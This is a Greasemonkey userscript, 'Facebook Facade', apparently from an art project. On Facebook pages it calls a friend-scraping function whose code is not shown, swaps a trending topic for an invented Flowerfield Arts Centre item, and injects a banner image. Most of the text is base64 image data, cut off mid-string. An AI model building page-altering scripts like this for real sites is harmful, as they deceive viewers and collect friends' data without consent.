// ==UserScript==
// @name         Facebook Facade
// @namespace    http://ryanpark.co.uk/
// @version      0.1
// @description  Things aren't always as they seem.
// @author       Ryan Park
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// @user-agent      Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1284.0 Safari/537.13

// @require      https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js
// @require      https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js

// ==/UserScript==

//Init - Executes on page load
function initFacade() {
    scrapeFriends();
    replaceTrending("_5my2", "#", "Flowerfield", "The facade has arrived at Flowerfield Arts Centre.");     
    $("#stream_pagelet").prepend("<div class='_4-u2 mbm' style='width: 100%; height: 100px; padding: 10px; box-sizing: border-box;'><img src='data:image/jpg;base64,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AAAAAAAAC2Nyb3BSZWN0VG9wbG9uZwAAAAAAOEJJTQPtAAAAAAAQAEgAAAABAAIASAAAAAEAAjhCSU0EJgAAAAAADgAAAAAAAAAAAAA/gAAAOEJJTQQNAAAAAAAEAAAAeDhCSU0EGQAAAAAABAAAAB44QklNA/MAAAAAAAkAAAAAAAAAAAEAOEJJTScQAAAAAAAKAAEAAAAAAAAAAjhCSU0D9QAAAAAASAAvZmYAAQBsZmYABgAAAAAAAQAvZmYAAQChmZoABgAAAAAAAQAyAAAAAQBaAAAABgAAAAAAAQA1AAAAAQAtAAAABgAAAAAAAThCSU0D+AAAAAAAcAAA/////////////////////////////wPoAAAAAP////////////////////////////8D6AAAAAD/////////////////////////////A+gAAAAA/////////////////////////////wPoAAA4QklNBAAAAAAAAAIAAThCSU0EAgAAAAAABAAAAAA4QklNBDAAAAAAAAIBAThCSU0ELQAAAAAABgABAAAAAjhCSU0ECAAAAAAAEAAAAAEAAAJAAAACQAAAAAA4QklNBB4AAAAAAAQAAAAAOEJJTQQaAAAAAANNAAAABgAAAAAAAAAAAAAAUAAAAEYAAAAMAGYAbABvAHcAZQByAGYAaQBlAGwAZABzAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAABGAAAAUAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAABAAAAABAAAAAAAAbnVsbAAAAAIAAAAGYm91bmRzT2JqYwAAAAEAAAAAAABSY3QxAAAABAAAAABUb3AgbG9uZwAAAAAAAAAATGVmdGxvbmcAAAAAAAAAAEJ0b21sb25nAAAAUAAAAABSZ2h0bG9uZwAAAEYAAAAGc2xpY2VzVmxMcwAAAAFPYmpjAAAAAQAAAAAABXNsaWNlAAAAEgAAAAdzbGljZUlEbG9uZwAAAAAAAAAHZ3JvdXBJRGxvbmcAAAAAAAAABm9yaWdpbmVudW0AAAAMRVNsaWNlT3JpZ2luAAAADWF1dG9HZW5lcmF0ZWQAAAAAVHlwZWVudW0AAAAKRVNsaWNlVHlwZQAAAABJbWcgAAAABmJvdW5kc09iamMAAAAB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YmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczpwaG90b3Nob3A9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGhvdG9zaG9wLzEuMC8iIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTQgKFdpbmRvd3MpIiB4bXA6Q3JlYXRlRGF0ZT0iMjAxNS0wNC0yNlQxNTozOTowMiswMTowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAxNS0wNC0yNlQxNTozOToyNSswMTowMCIgeG1wOk1vZGlmeURhdGU9IjIwMTUtMDQtMjZUMTU6Mzk6MjUrMDE6MDAiIGRjOmZvcm1hdD0iaW1hZ2UvanBlZyIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpiMjU1ZWMxYi1hNzY4LWQ4NDctOWI5Yi1hMTU3Yzc5NWZkMTYiIHhtcE1NOkRvY3VtZW50SUQ9ImFkb2JlOmRvY2lkOnBob3Rvc2hvcDowOTA5MjYzZi1lYzIyLTExZTQtYTlkZS04NjkxYTg3ODFjZjAiIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDphZmJiN2Q0MS1lOGVjLTczNDItODM2ZS03ZjZmNzBiOGYyZDEiIHBob3Rvc2hvcDpDb2xvck1vZGU9IjMiIHBob3Rvc2hvcDpJQ0NQcm9maWxlPSJzUkdCIElFQzYxOTY2LTIuMSI+IDx4bXBNTTpIaXN0b3J5PiA8cmRmOlNlcT4gPHJkZjpsaSBzdEV2dDphY3Rpb249ImNyZWF0ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6YWZiYjdkNDEtZThlYy03MzQyLTgzNmUtN2Y2ZjcwYjhmMmQxIiBzdEV2dDp3aGVuPSIyMDE1LTA0LTI2VDE1OjM5OjAyKzAxOjAwIiBzdEV2dDpzb2Z0d2FyZUFnZW50PSJBZG9iZSBQaG90b3Nob3AgQ0MgMjAxNCAoV2luZG93cykiLz4gPHJkZjpsaSBzdEV2dDphY3Rpb249InNhdmVkIiBzdEV2dDppbnN0YW5jZUlEPSJ4bXAuaWlkOjVkZmRhZWI5LWQzZDQtYTg0My1iNjk2LTBhZWE4YWQ0NTM1ZSIgc3RFdnQ6d2hlbj0iMjAxNS0wNC0yNlQxNTozOToyNSswMTowMCIgc3RFdnQ6c29mdHdhcmVBZ2VudD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTQgKFdpbmRvd3MpIiBzdEV2dDpjaGFuZ2VkPSIvIi8+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJjb252ZXJ0ZWQiIHN0RXZ0OnBhcmFtZXRlcnM9ImZyb20gYXBwbGljYXRpb24vdm5kLmFkb2JlLnBob3Rvc2hvcCB0byBpbWFnZS9qcGVnIi8+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJkZXJpdmVkIiBzdEV2dDpwYXJhbWV0ZXJzPSJjb252ZXJ0ZWQgZnJvbSBhcHBsaWNhdGlvbi92bmQuYWRvYmUucGhvdG9zaG9wIHRvIGltYWdlL2pwZWciLz4gPHJkZjpsaSBzdEV2dDphY3Rpb249InNhdmVkIiBzdEV2dDppbnN0YW5jZUlEPSJ4bXAuaWlkOmIyNTVlYzFiLWE3NjgtZDg0Ny05YjliLWExNTdjNzk1ZmQxNiIgc3RFdnQ6d2hlbj0iMjAxNS0wNC0yNlQxNTozOToyNSswMTowMCIgc3RFdnQ6c29mdHdhcmVBZ2VudD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTQgKFdpbmRvd3MpIiBzdEV2dDpjaGFuZ2VkPSIvIi8+IDwvcmRmOlNlcT4gPC94bXBNTTpIaXN0b3J5PiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo1ZGZkYWViOS1kM2Q0LWE4NDMtYjY5Ni0wYWVhOGFkNDUzNWUiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6YWZiYjdkNDEtZThlYy03MzQyLTgzNmUtN2Y2ZjcwYjhmMmQxIiBzdFJlZjpvcmlnaW5hbERvY3VtZW50SUQ9InhtcC5kaWQ6YWZiYjdkNDEtZThlYy03MzQyLTgzNmUtN2Y2ZjcwYjhmMmQxIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg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